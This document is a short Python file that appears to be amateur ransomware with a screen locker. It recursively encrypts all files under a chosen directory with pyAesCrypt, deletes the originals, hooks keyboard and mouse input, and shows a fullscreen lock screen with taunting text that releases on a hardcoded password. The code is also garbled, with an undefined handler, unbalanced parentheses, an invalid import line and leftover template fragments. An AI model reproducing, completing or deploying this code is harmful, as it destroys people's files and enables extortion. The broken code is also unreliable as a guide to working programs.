#all libaries
import imp
from turtle import width
import pyautogui
import pythoncom, pyHook
import os
import sys
#
hm = pyHook.HookManager()
hm.MouseAll = uMad
hm.KeyAll = uMad
hm.HookMouse()
hm.HookKeyboard()
pythoncom.PumpMessages
#
def callback(event):
    global k, entry
    if entry.get() == "123":
        k = True
#
def on_closing():
    click(width/2, height/2)
    moveTo(width/2, height/2)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)
#crypter
direct =input("Specify the target directory:")
password =input("Enter the password:")
with open("Crypt.py", "w") as crypt:
    crypt.write("program code")
def crypt(file):
    import pyAesCrypt
    print('-'*80)
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file)) + ".crp", password, buffer_size)
    print("[Enrypt}" + str(file)+ ".crp")
    os.remove(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)
walk("'''+str(direct)+'''")

#import
from tkinter import Tk, Entry, Label
from pyautogui coi import click, moveTo
from time import sleep
#create window
root = Tk()
#disable close
pyautogui.FAILSAFE = False
#set window size
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
#window text
root.title("From 0DD17Y with love")
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)
entry.place(width=150, height= 50, x=width/2-75, y=height/2-25)
label0 = Label(root, text="Get fucked by 0DD17Y PS: Your welcome", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Enter password and press Ctrl +C", font='Arial 20')
label1.place(x=width/2-75-130, y=height/2-25-100)
root.update
sleep(0.2)
click(width/2, height/2)
k=False
while not k:
    on_closing()